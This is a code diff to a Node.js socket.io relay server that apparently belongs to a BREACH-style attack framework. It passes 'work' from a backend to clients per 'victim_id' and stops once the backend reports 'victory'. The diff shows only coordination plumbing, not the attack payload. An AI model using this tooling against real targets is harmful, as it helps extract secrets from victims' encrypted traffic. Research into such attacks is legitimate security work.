@@ -1,6 +1,7 @@
 const io = require('socket.io'),
       winston = require('winston'),
-      http = require('http');
+      http = require('http'),
+      config = require('./config.js');
 
 winston.remove(winston.transports.Console);
 winston.add(winston.transports.Console, {'timestamp': true});
@@ -22,17 +23,17 @@ socket.on('connection', function(client) {
         var getWorkOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
-            path: '/breach/get_work'
+            path: '/breach/get_work/' + config.victim_id
         };
 
         http.request(getWorkOptions, function(response) {
-            var res_data = '';
+            var responseData = '';
             response.on('data', function(chunk) {
-                res_data += chunk;
+                responseData += chunk;
             });
             response.on('end', function() {
-                winston.info('Got (get-work) response from backend: ' + res_data);
-                client.emit('do-work', JSON.parse(res_data));
+                winston.info('Got (get-work) response from backend: ' + responseData);
+                client.emit('do-work', JSON.parse(responseData));
             });
         }).end();
     }
@@ -51,22 +52,24 @@ socket.on('connection', function(client) {
         var workCompletedOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
-            path: '/breach/work_completed',
+            path: '/breach/work_completed/' + config.victim_id,
             method: 'POST',
             json: requestBody
         };
 
         http.request(workCompletedOptions, function(response) {
-            var res = '';
+            var responseData = '';
             response.on('data', function(chunk) {
-                res += chunk;
+                responseData += chunk;
             });
             response.on('end', function() {
-                winston.info('Got (work-completed) response from backend: ' + res);
+                winston.info('Got (work-completed) response from backend: ' + responseData);
+                var victory = JSON.parse(responseData)['victory'];
+                if (victory === false) {
+                    createNewWork();
+                }
             });
         }).end();
-
-        createNewWork();
     });
     client.on('disconnect', function() {
         winston.info('Client ' + client.id + ' disconnected');
